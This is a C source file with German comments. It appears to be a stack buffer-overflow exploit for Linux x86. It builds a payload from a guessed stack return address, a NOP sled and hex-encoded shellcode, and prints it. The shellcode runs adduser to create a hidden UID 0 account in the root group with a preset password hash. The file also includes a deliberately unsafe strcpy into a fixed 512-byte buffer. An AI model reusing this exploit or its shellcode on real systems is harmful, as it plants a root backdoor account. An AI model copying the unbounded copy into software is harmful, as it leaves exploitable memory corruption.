#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/errno.h>

#define DEFAULT_OFFSET	500
#define DEFAULT_BUFFER	600
#define NOP			0x90

char shellcode[] =
	"\xeb\x67\x5e\x89\x76\x4c\x8d\x46"
	"\x12\x89\x46\x50\x8d\x46\x15\x89"
	"\x46\x54\x8d\x46\x17\x89\x46\x58"
	"\x8d\x46\x1a\x89\x46\x5c\x8d\x46"
	"\x1d\x89\x46\x60\x8d\x46\x22\x89"
	"\x46\x64\x8d\x46\x25\x89\x46\x68"
	"\x8d\x46\x48\x89\x46\x6c\x31\xc0"
	"\x88\x46\x11\x88\x46\x14\x88\x46"
	"\x16\x88\x46\x19\x88\x46\x1c\x88"
	"\x46\x21\x88\x46\x24\x88\x46\x47"
	"\x88\x46\x4b\x89\x46\x70\xb0\x0b"
	"\x89\xf3\x8d\x4e\x4c\x8d\x56\x70"
	"\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\x94\xff\xff\xff\x2f\x75"
	"\x73\x72\x2f\x73\x62\x69\x6e\x2f"
	"\x61\x64\x64\x75\x73\x65\x72\x23"
	"\x2d\x75\x23\x30\x23\x2d\x6f\x23"
	"\x2d\x67\x23\x72\x6f\x6f\x74\x23"
	"\x2d\x70\x23\x24\x31\x24\x37\xcf"
	"\x76\xd9\x4c\x4b\xcf\xb5\x24\x67"
	"\x53\x55\x4b\x47\x36\x52\x41\x4c"
	"\x7a\x52\x41\x38\x72\x79\x52\x4f"
	"\x63\x54\x73\x47\x30\x23\x72\x75"
	"\x74\x23";


unsigned long getESP(void) {
	__asm__("movl %esp,%eax");
}

void calc(char *str) {
	int i, j=0;
	char bb[512];
	strcpy(bb, str);
	i = j;
}

int main(int argc, char *argv[]) {
	char *buff, *tmp;
	int offset = DEFAULT_OFFSET, buffs = DEFAULT_BUFFER, i;
	long adr, *adr_pointer;
	if(argc>1)	
		offset = atoi(argv[1]);
	if(argc>2)
		buffs = atoi(argv[2]);
	
	buff = malloc(buffs);	//Speicherplatz aufm Heap reserviren

	adr = getESP() - offset;
	tmp = buff;
	adr_pointer = (long*) tmp;
	for(i=0;i<buffs;i+=4)	//Komplett mit der vermuteten Adresse füllen
		*(adr_pointer++) = adr;

	for(i=0;i<= buffs/2;i++) //erste Hälfte mit Nops füllen
		buff[i] = NOP;
	
	tmp = buff + ((buffs/2) - (strlen(shellcode)/2));
	for(i=0;i<strlen(shellcode);i++)
		*(tmp++) = shellcode[i];

	buff[buffs - 1] = '\0';

	/*calc(buff);*/

	printf("%s", buff);
	fflush(stdout);

	return 0;	

}
